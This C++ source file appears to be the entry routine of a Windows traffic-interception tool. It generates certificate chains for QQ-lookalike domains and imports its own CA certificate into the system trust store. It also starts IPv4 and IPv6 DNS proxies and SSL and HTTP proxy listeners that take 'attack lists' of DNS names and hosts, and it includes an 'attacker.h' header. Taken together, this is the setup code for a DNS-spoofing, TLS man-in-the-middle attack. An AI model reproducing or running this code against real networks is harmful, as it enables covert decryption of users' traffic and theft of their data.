

#include <WINSOCK2.H>
#include <windows.h>
#include <vector>
#include <iostream>
#include "sslEntry.h"
#include "sslPublic.h"
#include "sslPacket.h"
#include "../Utils/Tools.h"
#include "..\\include\\pcap.h"
#include "..\\include\\pcap\\pcap.h"
#include "..\\include\\openssl\\ssl.h"
#include "..\\include\\openssl\\err.h"

#include <DbgHelp.h>
#include "OpenSSLConfig.h"
#include "PluginServer.h"
#include "WeixinAndroid.h"
#include "../cipher/CryptoUtils.h"
#include "ImportCert.h"
#include "opensslconfig.h"

#include "MakeCert.h"

#include "../FileOper.h"
#include "InformerProc.h"
#include "InformerClient.h"
#include "../attacker.h"
#include "SSLRetransfer.h"
#include "../DnsUtils/DnsKeeper.h"

#include "HttpProxy.h"
#include "SSLProxy.h"
#include "SSLProxyListener.h"
#include "httpproxylistener.h"
#include "../Deamon.h"
#include "OtherListener.h"
#include "../DnsUtils/DnsProxy.h"
#include "../DnsUtils/DnsProxyIPV6.h"

using namespace std;

unsigned char	gLocalIPAddrV6[16] = { 0 };
DWORD			gLocalIPAddr = 0;
string			gstrLocalIP = "";

DWORD			gServerIP = 0;
string			gstrServerIP = "";

string			gLocalPath = "";
string			gOpensslPath = "";

//msvcr120.dll
//libcrypto-1.1.dll
//libssl-1.1.dll
int __cdecl SSLEntry::sslEntry(unsigned long serverIP,unsigned long localIP,string path,int control,
	vector<string>gDnsAttackList, vector<string>gHostAttackList,int mode)
{

	int	nRetCode = 0;

	//system("regsvr32 msvcr120.dll");

	gOpensslPath = OpenSSLConfig::getOpenSSLPath();
	if (gOpensslPath == "")
	{
		nRetCode = OpenSSLConfig::getOpenSSLPathFromCfg();
		if (gOpensslPath == "")
		{
			MessageBoxA(0, "need setup openssl", "need setup openssl", MB_OK);
			ExitProcess(0);
		}
	}

	if (gOpensslPath.back() == '\\')
	{
		gOpensslPath = gOpensslPath + "bin\\";
	}
	else {
		gOpensslPath = gOpensslPath + "\\bin\\";
	}
	
	string winOpensslPath = gOpensslPath;
	gOpensslPath = Public::winPath2Linux(winOpensslPath.c_str());

	nRetCode = OpenSSLConfig::addSystemPath(winOpensslPath);

	printf("set openssl path:%s\r\n", gOpensslPath.c_str());

	nRetCode = OpenSSLConfig::initOpensslPath(control);
	
	//MakeSureDirectoryPathExists must end with "\\"
	string outputpath = gLocalPath + OUTPUT_PATH + "\\";
	nRetCode = MakeSureDirectoryPathExists(outputpath.c_str());

	string certpath = gLocalPath + CERT_PATH + "\\";
	nRetCode = MakeSureDirectoryPathExists(certpath.c_str());

	string cacertpath = gLocalPath + CA_CERT_PATH + "\\";
	nRetCode = MakeSureDirectoryPathExists(cacertpath.c_str());

	string pluginpath = gLocalPath + "plugin\\";
	nRetCode = MakeSureDirectoryPathExists(pluginpath.c_str());

	nRetCode = SSLPublic::prepareCertChain("debugqq.com");
	nRetCode = SSLPublic::prepareCertChain("assistsqq.com");
	nRetCode = SSLPublic::prepareCertChain("lovemeqq.com");

	nRetCode = MakeCert::checkCAExist();

	nRetCode = ImportCert::ImportCACertification();

	InformerProc *informerProc = new InformerProc();

	Deamon * deamon = new Deamon();

	DnsProxy *dnsproxy = new DnsProxy(serverIP);

	DnsProxyIPV6 *dnsproxyipv6 = new DnsProxyIPV6(serverIP);

	DnsKeeper *dnskeeper = new DnsKeeper();
	
	SSLPublic *sslpublic = new SSLPublic(gHostAttackList);

	OtherListener * other8888 = new OtherListener(1864);//HCDNClientUpdate.ini
	OtherListener * other1864 = new OtherListener(8888);//tencetvideo pc
	OtherListener * other9090 = new OtherListener(9090);//letv

	HttpProxyListener *httplistener = new HttpProxyListener();

	SslProxyListener *ssllistener = new SslProxyListener();

	return nRetCode;
}
